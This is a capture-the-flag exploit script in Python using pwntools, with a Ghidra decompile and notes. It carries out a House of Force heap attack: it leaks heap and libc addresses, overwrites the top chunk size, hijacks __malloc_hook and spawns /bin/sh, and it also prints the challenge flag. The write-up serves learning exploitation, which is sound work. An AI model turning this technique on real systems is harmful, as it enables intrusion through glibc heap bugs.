#!/usr/bin/env python3

"""
Ghidra decompile

/* WARNING: Unknown calling convention */

void call_emergency_meeting(void)

{
  long in_FS_OFFSET;
  char tmp;
  ulong resp_size;
  char *response;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nWhy\'d you call an emergency meeting?! I was doing my tasks >:(");
  printf("\nUh oh, you\'ve been called out, how many characters will your response be? ");
  __isoc99_scanf("%lu%c",&resp_size,&tmp);
  printf("Enter your response: ");
  response = (char *)malloc(resp_size);
  fgets(response,0x40,stdin);
  printf("\nYou responded: %s\n",response);
  vote();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

This has a few vulnerabilities, noticeably the user controls input into malloc.
Also, the program doesn't use this as the value for fgets so there is a heap
overflow at play.  The program gives us a libc leak as well as the address
of a malloc block.  Using these we can complete a house of force attack since
the libc is < 2.29.

https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/

sun{4Re_y0U_th3_!mP0st3r_v3rY_su55!}
"""

from pwn import *


exe = ELF("./house_of_sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")

    r.recvuntil(b'game: ')

    # Get malloc leak
    heap_start = int(r.recvuntil(b'\n').decode('utf-8'), 16)
    log.progress("Got malloc start: ", hex(heap_start))


    # Get libc leak
    r.recvuntil(b'meeting')
    r.sendline(b'1')
    r.recvuntil(b'meeting')
    r.sendline(b'2')
    r.recvuntil(b'seed: ')
    libc_rand = int(r.recvuntil(b'\n').decode('utf-8'))
    libc.address = libc_rand - libc.symbols['rand']
    log.progress("Got libc leak: ", hex(libc.address))
    r.sendline(b'1')
    r.recvuntil(b'meeting')

    # Function to send a malloc request
    def malloc(size, data):
        r.sendline(b'3')
        r.recvuntil(b':(')
        r.sendline(str(size).encode('utf-8'))
        r.sendline(data)
        r.recvuntil(b'(You)')
        r.sendline(b'1')
        r.recvuntil("meeting")

    # Overwrite wilderness value
    malloc(8, b'')
    malloc(8, b'')
    malloc(24, b"A"*24 + p64(0xffffffffffffffff))

    # Overwrite __malloc_hook with be_imposter function address
    # and write /bin/sh to a block
    # Offsets calculated in gdb by trial and error
    distance = libc.sym.__malloc_hook - heap_start - 0x1090
    malloc(distance, "/bin/sh\0")
    malloc(24, p64(exe.sym['be_imposter']))

    # Allocate a block of the offset size (0x10 less then other offset)
    # this will actually trigger the be_imposter function passing
    # the address of the /bin/sh block to it as an argument
    r.sendline(b'3')
    r.recvuntil(b':(')
    r.sendline(str(heap_start+0x1080).encode('utf-8'))

    r.interactive()


if __name__ == "__main__":
    main()
